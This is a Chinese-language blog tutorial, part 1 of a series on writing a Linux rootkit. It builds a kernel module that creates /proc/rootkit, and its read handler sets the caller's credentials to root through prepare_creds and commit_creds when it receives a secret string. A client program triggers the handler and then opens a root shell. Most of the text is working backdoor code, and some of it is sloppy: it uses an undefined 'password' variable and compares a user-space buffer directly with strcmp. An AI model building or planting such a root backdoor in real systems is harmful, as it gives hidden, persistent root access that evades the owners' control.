---
title: 编写Linux rootkit - 1
date: 2018-03-23
tag: Bin
layout: post
---

Linux rootkit是非常有趣的内核模块练习.如果做个比喻的话,rootkit就是内核级别的Hook程序.

这一次实现的是最简单的部分,我们直接创建一个新的proc文件,并使用proc文件的read方法传递命令.

本次实现的命令为获取root权限.

## 头文件

我们需要在client程序中引用rootkit程序中的一些参数,比如proc文件的名称,rootkit中设定的命令名称等.虽然可以写死在程序中,但是会给后续的修改带来麻烦.

因为功能很简单,我们只需要添加proc文件名称和getRoot的命令名称.

``` c
static char procfile[] = "rootkit";
static char get_root[] = "getroot";
```

## 创建proc文件

接下来的内核模块主体分为两部分: 创建proc文件, 实现根据参数执行命令的read方法.

在Linux 4.X的内核版本上,这两部分与以往相比都有变化.先说proc文件.

在3.X之前,创建proc文件是通过下面的函数进行的:

``` c
struct proc_dir_entry *create_proc_read_entry(const char *name,
                                    mode_t mode, struct proc_dir_entry *base,
                                    read_proc_t *read_proc, void *data);

typedef int (*read_proc_t)(char *page, char **start, off_t offset, int count,
                        int *eof, void *data);
```

但是这个函数在4.X的版本中已经被废弃了.我们不能简单的书写一个`read_proc_t`函数,然后传递给create参数.

目前创建proc文件使用的函数如下:

```
struct proc_dir_entry *proc_create(const char *name, umode_t mode,
                            struct proc_dir_entry *parent,
                            const struct file_operations *proc_fops);
```

可以发现,现在的proc文件使用的是更加通用的`file_operations`结构.这个结构用于各种文件操作相关的函数,比如设备读写等等.我们需要自己填充一个`file_operations`结构.这个结构体中的内容非常多,除了最基本本的open,read,write之外,还包括读写位置相关操作,目录操作,阻塞标志位等.

对于我们而言,只需要关心其中的read和write方法.

``` c
ssize_t (*read)(struct file *filp, char __user *buff,
            size_t count, loff_t *offp);
ssize_t (*write)(struct file *filp, const char __user *buff,
            size_t count, loff_t *offp);
```

open方法在fops中不是必须实现的.如果没有实现open(也就是open的指针值为NULL)方法,那么每次打开文件一定会成功.

方法的具体实现在下面.现在我们可以填充`file_operations`了:

``` c
static struct file_operations proc_fops = {
    .owner = THIS_MODULE,
    .read = read_fops,
};
```

因为我使用read方法传递命令,所以并没有实现write方法.

获得了fops结构,剩下的就是创建proc文件了:

``` c
proc_create(procfile, 0, NULL, &proc_fops);
```

procfile变量在头文件中定义为rootkit.这样我们便在`/proc`目录下创建了文件rootkit.

## read方法与权限提升

这一次实现的rootkit函数只有getRoot,也就是权限提升.我们在read方法中判断要执行的命令,并且完成相应的功能.

先来说一下权限提升.

在内核最开始的版本中,进程权限是写在进程对应的task结构中的,与uid,gid对应的也仅仅是简单的整数类型.

后来的变更中,整个权限部分被移植到了cred结构中,task中只保留了指向对应cred的指针.但是对于uid和gid来说,他们仍然是简单的整数类型,直接被保存在cred结构中.

对于uid和gid,数值0代表了root权限.于是我们只需要`cred->uid = cred->gid = 0`即可完成权限提升.

但是现在cred中的uid和gid是这样的:

``` c
struct cred{
    ...
    kuid_t uid;
    kgid_t gid;
    kuid_t suid;
    kgid_t sgid;
    kuid_t euid;
    kgid_t egid;
    ...
}
```

这一次他们的类型不是整数了.我们展开`kuid_t`和`kgid_t`:

``` c
typedef struct {
    uid_t val;
} kuid_t;

typedef struct {
    gid_t val;
} kgid_t;
```

`uid_t`和`gid_t`仍然是整数类型.而且在内存中,单元素的结构体和一个变量本身相同,所以这只是简单的封装而已.

但是我们不能在获得一个新的cred后简单的使用`cred->uid = 0`来设定root权限了.对于`kuid_t`和`kgid_t`结构,我们可以使用下面的宏:

``` c
#define KUIDT_INIT(value) (kuid_t){ value }
#define KGIDT_INIT(value) (kgid_t){ value }
```

这同样是简单的封装,但是比手写结构体要清晰的多.这一组定义都包含在头文件`<linux/uidgid.h>`中,因为他们已经在`cred.h`中被包含了,我们无需重复include.

了解了新的root权限设定方式,我们可以完成我们的read方法了:

``` c
static ssize_t read_fops(struct file *filp, char __user *buff,
                    size_t count, loff_t *offp)
{
    check_command(buff);

    return count;
}

static int check_command(const char __user *buff){
    // get privileges
    if(!strcmp(buff, password)){
        struct cred *new_cred = prepare_creds();
        new_cred->uid = KUIDT_INIT(0);
        new_cred->gid = KGIDT_INIT(0);
        new_cred->euid = KUIDT_INIT(0);
        new_cred->egid = KGIDT_INIT(0);
        commit_creds(new_cred);
    }
    else{
        return 0;
    }

    return 1;
}
```

因为什么都没有,所以read方法在最后只需要简单的返回一个count就可以了.我们使用`prepare_creds`来获取一个新的cred.这个新的cred继承自当前进程的cred,所以我们需要使用上面的宏将其uid和gid设定为0,也就是root权限.最后,使用`commit_creds`覆盖旧的cred即可完成权限提升.

这其实没有什么用处.虽然模块运行在root权限,可以在进程上下文中为所欲为,但是安装内核模块同样需要root权限.也就是说,我们需要用root权限来完成提权.这和sudo有什么区别呢?

## client程序

我们需要编写客户端程序来执行rootkit的命令.

``` c
char proc_file[64];

sprintf(proc_file, "/proc/%s", procfile);

int fd = open(proc_file, O_RDONLY);

read(fd, get_root, strlen(password));

system("/bin/bash");
```

除了上面的几句之外,我们还可以对fd进行检查,甚至安全的拷贝我们的`proc_file`数组.

编译我们的模块和客户端程序,使用insmod装载,执行客户端程序,我们便完成了权限提升.

## 总结

阅读内核源代码是解决问题的最好方案.

创建proc文件方式的变动让我不得不了解fops结构体.但是fops结构体的open方法让人困惑,直到我在书中的其他部分知道了这并不是必要的.

关于cred则十分有趣.因为我们编写的是内核模块,所以为了通过编译不得不再次翻阅源码来找到正确的uid设定方式.但是它在内存中仍旧只是一个整数长度,漏洞攻击时对此无需理会.

网络上关于内核的文章总是跟不上内核更新的进度.手握源码,才能了解一切(笑).


